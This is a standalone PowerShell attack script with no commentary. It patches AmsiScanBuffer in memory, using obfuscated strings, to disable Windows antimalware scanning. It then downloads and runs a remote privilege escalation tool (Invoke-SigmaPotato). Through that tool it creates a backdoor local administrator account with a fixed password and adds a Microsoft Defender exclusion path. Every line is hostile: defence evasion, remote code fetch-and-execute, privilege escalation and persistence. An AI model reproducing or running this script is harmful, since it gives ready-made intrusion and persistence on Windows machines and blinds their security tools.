#Rasta-mouses Amsi-Scan-Buffer patch \n
$F8yt9pHgAxtpVUGCLmZy = @"
using System;
using System.Runtime.InteropServices;
public class F8yt9pHgAxtpVUGCLmZy {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr xl5NVaBQq2Zc, string PAib5Uhs_DmxQ8J);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr D6hB0eCRElcRRNg, UIntPtr uzKhADBa_LwOgt7C8V5, uint v5NtDk, out uint S79S1_oQdYPMIoMvdmG);
}
"@

Add-Type $F8yt9pHgAxtpVUGCLmZy

$TTSw1yUNIs = [F8yt9pHgAxtpVUGCLmZy]::LoadLibrary("$([chAR](97+33-33)+[CHaR]([byte]0x6d)+[CHAR]([bYTE]0x73)+[ChAr](105+70-70)+[chAR]([bYTE]0x2e)+[CHAr](69+31)+[CHAR]([BytE]0x6c)+[chAr](108+98-98))")
$D6t = [F8yt9pHgAxtpVUGCLmZy]::GetProcAddress($TTSw1yUNIs, "$([cHaR]([bYtE]0x41)+[Char]([Byte]0x6d)+[ChAr]([bYte]0x73)+[chAR]([Byte]0x69)+[chaR](83)+[cHAr]([byte]0x63)+[cHAr](97)+[cHAR]([byTE]0x6e)+[CHAR]([bYte]0x42)+[chAr]([bYTE]0x75)+[cHaR](59+43)+[Char]([Byte]0x66)+[ChAr](101*69/69)+[CHar](92+22))")
$p = 0
[F8yt9pHgAxtpVUGCLmZy]::VirtualProtect($D6t, [uint32]5, 0x40, [ref]$p)
$fzya50oB = "0xB8"
$Vb8Kuv7COO2 = "0x57"
$ODkN83_ptIJ4Di0aaKqB = "0x00"
$W6Lfk8hNa_eHf8jk = "0x07"
$BaJHlojP01OH = "0x80"
$fm2E5 = "0xC3"
$JVBW7 = [Byte[]] ($fzya50oB,$Vb8Kuv7COO2,$ODkN83_ptIJ4Di0aaKqB,$W6Lfk8hNa_eHf8jk,+$BaJHlojP01OH,+$fm2E5)
[System.Runtime.InteropServices.Marshal]::Copy($JVBW7, 0, $D6t, 6)
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-SigmaPotato.ps1')
Invoke-SigmaPotato -command "net user k kopq@123 /add"
Invoke-SigmaPotato -command "net localgroup administrators k /add"
Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath C:\programdata"









